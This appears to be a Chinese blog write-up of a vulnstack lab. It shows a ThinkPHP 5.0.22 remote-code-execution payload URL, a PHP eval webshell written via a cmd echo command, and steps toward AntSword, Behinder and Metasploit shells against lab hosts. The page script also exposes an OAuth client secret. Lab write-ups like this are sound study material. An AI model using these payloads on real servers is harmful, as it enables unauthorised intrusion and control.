<!DOCTYPE html>
<html lang="zh-CN">
<head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            vulnstack靶场学习记录-反弹shell1
        
    </title>
    <link rel="icon" href="/img/favicon.png"/>
    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    
<link rel="stylesheet" href="/css/hljs.min.css">

    
<script src="/js/hljs.min.js"></script>
  
    
<script src="/js/gitment.browser.js"></script>
  
<meta name="generator" content="Hexo 4.2.0"></head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hexo
        </a>
    </h1>
    <h2>
        <a class="motto">
            Ponyo loves Sōsuke!
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/vevlins/" target="_blank" rel="noopener" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
                <li class="menu-item">
                    <a class="menu-item-link search">
                        Search                   
                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
                    </a>
                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)"></input>
                </li>
                
        </ul>
    </nav>
</header>
    <main class="main">
        <article class="post">
            <h1>
                <a class="title" href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell1/"> 
                    vulnstack靶场学习记录-反弹shell1 
                </a>
            </h1>
            <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-04-01   
                </a>
                
                
                
                    
            </div>
<div class="toc">
  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#靶机信息"><span class="toc-list-text">靶机信息</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#其他信息"><span class="toc-list-text">其他信息</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#靶机准备"><span class="toc-list-text">靶机准备</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#靶机端口扫描"><span class="toc-list-text">靶机端口扫描</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#访问80端口"><span class="toc-list-text">访问80端口</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#thinkphp-rce利用"><span class="toc-list-text">thinkphp rce利用</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#传马得shell"><span class="toc-list-text">传马得shell</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#反弹msfshell"><span class="toc-list-text">反弹msfshell</span></a></li></ol>
</div>
            <div class="content">
                <h1 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h1><ol>
<li>双网卡win7 模拟内外网<ol>
<li>内网 192.168.138.136</li>
<li>外网 172.16.10.128</li>
</ol>
<ul>
<li>普通用户heart/2020</li>
<li>域管理 Administrator/dc123.com</li>
</ul>
</li>
<li>win2008 <ol>
<li>192.168.138.138</li>
</ol>
</li>
</ol>
<h1 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h1><p>本机ip（vmnet8）  1. 172.16.10.1<br>本机与win7网卡b模拟外网环境；win2008和win7网卡a模拟内网环境</p>
<h1 id="靶机准备"><a href="#靶机准备" class="headerlink" title="靶机准备"></a>靶机准备</h1><ul>
<li>win7靶机以非域管理员身份打开  C:\phpstudy\phpstudy.exe</li>
</ul>
<h1 id="靶机端口扫描"><a href="#靶机端口扫描" class="headerlink" title="靶机端口扫描"></a>靶机端口扫描</h1><p><img src="https://i.loli.net/2020/04/01/XQPHr7B9kL5RZKe.jpg" alt=""></p>
<ol>
<li>172.16.10.128 80/3306端口</li>
</ol>
<h1 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h1><ol>
<li>thinkphp架构<br><img src="https://i.loli.net/2020/04/01/yZrgKXncB6D8vtu.jpg" alt=""></li>
<li>访问错误页面，得到版本型号<br><img src="https://i.loli.net/2020/04/01/Oi2p4bDMNknAozJ.jpg" alt=""></li>
</ol>
<h1 id="thinkphp-rce利用"><a href="#thinkphp-rce利用" class="headerlink" title="thinkphp rce利用"></a>thinkphp rce利用</h1><ol>
<li><p><code>searchsploit thinkphp</code></p>
</li>
<li><p>找到对应版本 5.X, -m参数导出到本地<br><code>searchsploit -m exploits/php/webapps/46150.txt</code></p>
</li>
<li><p>读取载荷信息<br><code>cat 46150.txt</code><br><img src="https://i.loli.net/2020/04/01/wif2Y3ZaEWR7srB.jpg" alt=""></p>
</li>
<li><p>找到对应版本，用的第三个payload，修改最后的参数值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp_5.0.22&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/04/01/SMHgjGFepZIDsR2.jpg" alt=""></p>
<ul>
<li><p>成功执行了系统命令–此时只是调用系统函数执行的系统命令，我们需要得到可交互式的shell</p>
</li>
<li><p>采用的方式是先在web端写入webshell源码，用蚁剑连接之后，用蚁剑上传冰蝎的phpshell，冰蝎连接。</p>
</li>
</ul>
</li>
</ol>
<h1 id="传马得shell"><a href="#传马得shell" class="headerlink" title="传马得shell"></a>传马得shell</h1><ol>
<li>写入wehshell源码<br><code>echo ^&lt;?php eval($_POST[&#39;a&#39;]);?^&gt; &gt; 5.php</code> (cmd 转义字符 ^)<ul>
<li>文件有了</li>
</ul>
</li>
</ol>
<p><img src="https://i.loli.net/2020/04/01/bSmqGo8e3cNZxsp.jpg" alt=""></p>
<ul>
<li>源码无误</li>
</ul>
<p><img src="https://i.loli.net/2020/04/01/aGxHimbByILvU43.jpg" alt=""><br>2. 连蚁剑<br><img src="https://i.loli.net/2020/04/01/jAzH1c3VXkK6Crs.jpg" alt=""><br>3. 上传文件–冰蝎的webshell<br>4. 冰蝎连 <code>http://172.16.10.128/shell.php</code><br>    1. <img src="https://i.loli.net/2020/04/01/Ya7JK2RveNiuIw6.jpg" alt=""><br>    2. <img src="https://i.loli.net/2020/04/01/38Q4alLj5FJyhiq.jpg" alt=""></p>
<h1 id="反弹msfshell"><a href="#反弹msfshell" class="headerlink" title="反弹msfshell"></a>反弹msfshell</h1><ol>
<li>根据上面的提示<br> <img src="https://i.loli.net/2020/04/01/sPLfaMB6KDmjSlA.jpg" alt=""></li>
<li>反弹msfshell</li>
</ol>
<p><img src="https://i.loli.net/2020/04/01/zKWy7xC9Sdih6mo.jpg" alt=""></p>

            </div>
          
           
            <div class="copyright">
                <div class="name">
                    <a>Author:</a>
                    <a>Sōsuke</a>
                </div>
                <div class="link">
                    <a>Link:</a>
                    <a class="permalink" href="http://yoursite.com/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell1/">http://yoursite.com/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell1/</a>
                </div>
                <div class="license">
                    <a>Statement:</a>
                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                </div>
            </div>
            

          


</article>


<div class="tip">
<button class="tip-btn">
    Tip
</button>
<div class="tip-img">
<ul>
    
<li>
    <img src="/img/qrcode.jpeg"></img>
</li>

 
<li>
    <img src="/img/qrcode.jpeg"></img>
</li>

</ul>
</div>
</div>

<div class="more">

<div></div>

</div>

<div class="bdsharebuttonbox">
<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
</a>
<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
</a>
<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
</a>
<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
</a>
</div>
<script>
window._bd_share_config={
    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script>
 
<div id="comments"></div>

<script>
    var gitment = new Gitment({
    id: "Wed Apr 01 2020 17:48:20 GMT+0800",
    owner: "Vevlins",
    repo: "Vevlins.github.io",
    oauth: {
      client_id:"8d83609a651e972e308d",
      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
    }
  })
  gitment.render('comments')
</script>
    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    
<script src="/js/jquery.js"></script>

    
<script src="/js/toki.js"></script>
  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>